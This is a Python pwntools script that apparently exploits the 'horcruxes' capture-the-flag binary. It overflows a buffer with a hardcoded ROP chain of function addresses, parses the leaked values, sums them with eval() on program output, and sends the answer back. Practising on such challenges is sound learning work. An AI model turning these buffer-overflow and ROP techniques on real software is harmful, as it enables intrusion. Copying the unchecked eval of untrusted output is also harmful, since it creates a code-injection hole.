import pwn
from pwn import p32
import time

A_ADDRESS = 0x0809FE4B
C_ADDRESS = 0x809fe6a
B_ADDRESS = 0x809fe89
D_ADDRESS = 0x809fea8
E_ADDRESS = 0x809fec7
F_ADDRESS = 0x809fee6
G_ADDRESS = 0x809ff05
ROP_ME_ADDRESS = 0x0809FFFC

EBP_FILLER = b"BBBB"


def make_rop_chain():
    # rop_chain = b"Z"*96
    # rop_chain += EBP_FILLER
    # rop_chain += b"\xf9\xff\x09\x08\xaa\x31\x0a\x08\x00\x00\xff\x7f\x38\xca\xff\xff"
    # rop_chain += b"\xf9\xff\x09\x08\x0a\x31\x0a\x08\x00\x00\xff\x7f\x38\xca\xff\xffKKKKK\xfe\t\x08\x89\xfe\t\x08j\xfe\t\x08\xa8\xfe\t\x08\xc7\xfe\t\x08\xe6\xfe\t\x08\x05\xff\t\x08\xfc\xff\t\x08"
    # rop_chain += p32(A_ADDRESS)
    # rop_chain += p32(B_ADDRESS)
    # rop_chain += p32(C_ADDRESS)
    # rop_chain += p32(D_ADDRESS)
    # rop_chain += p32(E_ADDRESS)
    # rop_chain += p32(F_ADDRESS)
    # rop_chain += p32(G_ADDRESS)
    # rop_chain += p32(ROP_ME_ADDRESS)
    # return rop_chain
    return "1\n"+"Z"*96 + "\xef\xbe\xad\xde" + "\xf9\xff\x09\x08\x0a\x31\x0a\x08\x00\x00\xff\x7f\x38\xca\xff\xffKKKKK\xfe\t\x08\x89\xfe\t\x08j\xfe\t\x08\xa8\xfe\t\x08\xc7\xfe\t\x08\xe6\xfe\t\x08\x05\xff\t\x08\xfc\xff\t\x08".replace("\x0a", "z")

def main():
    # rop = make_rop_chain()
    # msg =  rop
    p = pwn.process("./horcruxes")
    # time.sleep(3)
    # p.recvuntil(b"Menu:")
    # print(msg)
    # p.sendline(msg)
    # p.recvuntil(b"Menu:")
    # time.sleep(3)
    # p.recvuntil(b"Menu:")
    # p.recvuntil("earned?")
    # p.recvuntil("earned?")
    # p.recvall()
    # time.sleep(2)
    # p.recvall()
    # p.interactive()
    # print("1\n"+"Z"*96 + "\xef\xbe\xad\xde" + "\xf9\xff\x09\x08\x0a\x31\x0a\x08\x00\x00\xff\x7f\x38\xca\xff\xffKKKKK\xfe\t\x08\x89\xfe\t\x08j\xfe\t\x08\xa8\xfe\t\x08\xc7\xfe\t\x08\xe6\xfe\t\x08\x05\xff\t\x08\xfc\xff\t\x08".replace("\x0a", "z") + "shitfuck\nkaki")
    with open("answer2.bin", "rb") as f:
        data = f.read()
    p.send_raw(data)
    print(data)
    a =p.recvall(timeout=0.1)
    print(a)
    b = a.split(b"\n")
    c = b''.join([x.split()[-1][:-1] for x in b if b"+" in x and x.endswith(b")")])
    x = str(eval(c)) + "\n" 
    print(f"x = {x}")
    # import ipdb
    # ipdb.set_trace()
    p.send_raw(x)
    # p.send_raw(x)
    print(p.recvall(timeout=1))
    # p.interactive()

if __name__ == "__main__":
    main()





# \x4B\xFE\x09\x08\x0a\x9e\x6f\x80\x09\x9e\x8f\x80\x08\x9e\xaf\x80\x07\x9e\xcf\x80\x06\x9e\xef\x80\x05\x9f\x0f\x80\xFC\xFF\x09\x08